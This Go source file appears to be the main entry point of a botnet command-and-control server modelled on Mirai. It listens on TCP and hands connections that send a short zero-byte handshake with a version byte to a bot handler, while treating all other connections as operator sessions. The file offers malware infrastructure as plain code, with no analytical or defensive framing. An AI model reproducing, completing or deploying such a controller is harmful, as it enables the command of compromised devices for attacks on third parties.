package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"time"
)

type ServerConfig struct {
	Host string `json:"host"`
	Port int    `json:"port"`
}

type DatabaseConfig struct {
	Path string `json:"path"`
}

type Config struct {
	Server   ServerConfig   `json:"server"`
	Database DatabaseConfig `json:"database"`
}

var (
	clientList = NewClientList()
	config     Config
	database   *Database
)

func main() {
	var err error
	config, err = loadConfig("assets/config.json")
	if err != nil {
		fmt.Println("[main - Call loadConfig]", err)
		return
	}

	tel, err := net.Listen("tcp", fmt.Sprintf("%s:%d", config.Server.Host, config.Server.Port))
	if err != nil {
		fmt.Println(err)
		return
	}

	database = NewDatabase(config.Database.Path)

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go initialHandler(conn)
	}

	fmt.Println("[main - Listener]", "Stopped accepting connections")
}

func loadConfig(filename string) (Config, error) {
	var config Config

	data, err := os.ReadFile(filename)
	if err != nil {
		return config, err
	}

	err = json.Unmarshal(data, &config)
	if err != nil {
		return config, err
	}

	return config, nil
}

func initialHandler(conn net.Conn) {
	defer func(conn net.Conn) {
		err := conn.Close()
		if err != nil {

		}
	}(conn)

	err := conn.SetDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		return
	}

	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return
	}

	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			stringLen := make([]byte, 1)
			l, err := conn.Read(stringLen)
			if err != nil || l <= 0 {
				return
			}
			var source string
			if stringLen[0] > 0 {
				sourceBuf := make([]byte, stringLen[0])
				l, err := conn.Read(sourceBuf)
				if err != nil || l <= 0 {
					return
				}
				source = string(sourceBuf)
			}
			NewBot(conn, buf[3], source).Handle()
		} else {
			NewBot(conn, buf[3], "").Handle()
		}
	} else {
		NewAdmin(conn).Handle()
	}
}

func netShift(prefix uint32, netmask uint8) uint32 {
	return prefix >> (32 - netmask)
}
